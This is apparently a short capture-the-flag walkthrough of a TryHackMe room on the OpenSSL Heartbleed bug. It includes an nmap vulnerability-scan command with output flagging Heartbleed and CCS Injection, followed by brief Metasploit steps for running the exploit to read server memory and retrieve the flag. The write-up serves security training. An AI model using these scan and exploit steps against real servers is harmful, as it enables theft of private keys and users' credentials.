---
title: Walkthrough - Heartbleed
published: false
---

Tags: Heartbleed, CTF, metasploit.
Description: SSL issues are still lurking in the wild. Can you exploit this web servers OpenSSL?
Difficulty: Easy
URL: [https://tryhackme.com/room/heartbleed](https://tryhackme.com/room/heartbleed)

* * *

## Notes

Heartbleed is a bug due to the implementation in the OpenSSL library from versions 1.0.1 to 1.0.1f(which is very widely used). It allows a user to access memory on the server(which they usually wouldn't have access to). This in turn allows a malicious user to access different kinds of information(that they wouldn't usually have access to due to the encryption and integrity provided by TLS) including:

   - server private key

   - confidential data like usernames, passwords and other personal information

- `sudo nmap -sC -sV -sT --script vuln -O 54.246.8.10 -p22,25,111,113,443,58869`

```
443/tcp   open     ssl/http nginx 1.15.7
| ssl-ccs-injection: 
|   VULNERABLE:
|   SSL/TLS MITM vulnerability (CCS Injection)
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h
|       does not properly restrict processing of ChangeCipherSpec messages,
|       which allows man-in-the-middle attackers to trigger use of a zero
|       length master key in certain OpenSSL-to-OpenSSL communications, and
|       consequently hijack sessions or obtain sensitive information, via
|       a crafted TLS handshake, aka the "CCS Injection" vulnerability.
|           
|     References:
|       http://www.cvedetails.com/cve/2014-0224
|       http://www.openssl.org/news/secadv_20140605.txt
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224
| ssl-heartbleed: 
|   VULNERABLE:
|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
|           
|     References:
|       http://www.openssl.org/news/secadv_20140407.txt 
|       http://cvedetails.com/cve/2014-0160/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160
```

1. `msfconsole`
2. `search openssl heartbleed`
3. set options
4. exploit 
5. I had to run this exploit about 4-5 times in order to find the flag.

* * * 

![0xskar](/assets/heartbleed01.png)

* * * 

